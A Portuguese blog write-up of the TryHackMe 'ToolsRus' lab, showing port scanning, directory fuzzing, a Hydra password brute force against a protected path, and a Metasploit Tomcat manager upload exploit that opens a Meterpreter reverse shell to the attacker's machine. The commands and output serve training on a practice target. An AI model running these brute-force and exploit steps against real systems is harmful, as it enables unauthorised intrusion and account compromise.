---
title: 'TryHackMe: ToolsRus'
author: Kertonli
categories: [TryHackMe]
tags: [Fácil, Nmap, Ffuf]
image:
  path: assets/images/tryhackme/toolsrus/room.png
---

Meu alvo é http://10.10.42.84/

Entrando no navegador temos uma mensagem dizendo que tem outras partes do site funcionando... (que conveniente rsrs)

![alt text](assets/images/tryhackme/toolsrus/image1.png)

Ok, vamos começar com o clássico nmap rápido em todas as portas

```
nmap -p- -T4 10.10.42.84

Nmap scan report for 10.10.42.84
Host is up (0.19s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline
8009/tcp open  ajp13

Nmap done: 1 IP address (1 host up) scanned in 866.10 seconds

```

Vamos obter mais informações dessas portas usando os scripts do nmap

```

nmap -sC -sV -T4 -p 22,80,1234,8009 10.10.42.84

Nmap scan report for 10.10.42.84
Host is up (0.29s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:4b:f8:1d:f8:a8:3d:2a:c4:55:68:4c:8e:75:e3:7b (RSA)
|   256 55:fd:95:15:ce:49:6d:31:1f:ad:7a:de:8b:08:3c:87 (ECDSA)
|_  256 d2:7b:32:5b:86:ec:64:26:13:98:77:8c:f9:ae:f9:8f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.84 seconds


```

Só com isso da pra resolver algumas perguntas do Tryhackme (5,6,8,9)

Na minha cabeça o próximo passo lógico é enumerar os arquivos, não me parece que esse é um desafio com subdomínios. Vamos usar o ffuf pois é uma ferramenta mais rápida.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.10.42.84/FUZZ -c -v


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.42.84/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 313ms]
| URL | http://10.10.42.84/.htaccess
    * FUZZ: .htaccess

[Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 313ms]
| URL | http://10.10.42.84/.htpasswd
    * FUZZ: .htpasswd

[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 306ms]
| URL | http://10.10.42.84/guidelines
| --> | http://10.10.42.84/guidelines/
    * FUZZ: guidelines

[Status: 401, Size: 458, Words: 42, Lines: 15, Duration: 222ms]
| URL | http://10.10.42.84/protected
    * FUZZ: protected

[Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 305ms]
| URL | http://10.10.42.84/server-status
    * FUZZ: server-status

:: Progress: [20478/20478] :: Job [1/1] :: 130 req/sec :: Duration: [0:02:24] :: Errors: 0 ::


```

Lembrando 403: Forbiddeen, 301: Moved Permanently, 401: Unauthorized. Olhando para o log, o 301 e o 401 são promissores. Com isso conseguimos responder algumas questões (1,3)

A questão 2 pode ser respondida visitando a rota /guidelines

![alt text](assets/images/tryhackme/toolsrus/image2.png)

Ok, para responder a questão 4 precisamos descobrir a senha do bob. Como a atividade quer nos ensinar a usar o hydra provavelmente precisamos usar ataque de força bruta na rota protected.

```

hydra -l bob -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt -f 10.10.42.84 -s 80 http-get /protected

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-11 16:41:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task
[DATA] attacking http-get://10.10.42.84:80/protected
[80][http-get] host: 10.10.42.84   login: bob   password: bubbles
[STATUS] attack finished for 10.10.42.84 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-11 16:41:37


```

Com isso descobrimos a senha e temos a resposta da questão 4. Agora vamos explorar um pouco da porta 1234 visto que as próximas perguntas focam nelas.

![alt text](assets/images/tryhackme/toolsrus/image3.png)

![alt text](assets/images/tryhackme/toolsrus/image4.png)

Vamos usar o Nikto como o roteiro manda

```

nikto -id bob:bubbles -h http://10.10.42.84:1234/manager/html


```

Então eu adoraria mostrar a saída do comando mas essa ferramenta levou 1 hora para terminar e nem acabou, ele caiu porque a máquina do tryhackme expirou o tempo. Não gostei nada dessa ferramenta. a Resposta da questão 7 eu chutei até acertar.

Para finalizar vamos procurar um exploit desse apache tomcat rodando na porta 1234.

```

msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  bubbles          no        The password for the specified username
   HttpUsername  bob              no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.225.174    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                            cs/using-metasploit.html
   RPORT         1234             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.8.18.71       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
[*] Started reverse TCP handler on 10.8.18.71:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying I3dDU71Q4m25pG4FZE8XwMv...
[*] Executing I3dDU71Q4m25pG4FZE8XwMv...
[*] Sending stage (58073 bytes) to 10.10.225.174
[*] Undeploying I3dDU71Q4m25pG4FZE8XwMv ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.8.18.71:4444 -> 10.10.225.174:41514) at 2025-02-11 18:50:03 -0300

meterpreter > 


```

Conseguimos entrar. Aqui é tranquilo, só usar getuid e ver o usuário, entrar na pasta do usuário e pegar a flag.


![alt text](assets/images/tryhackme/toolsrus/image5.png)



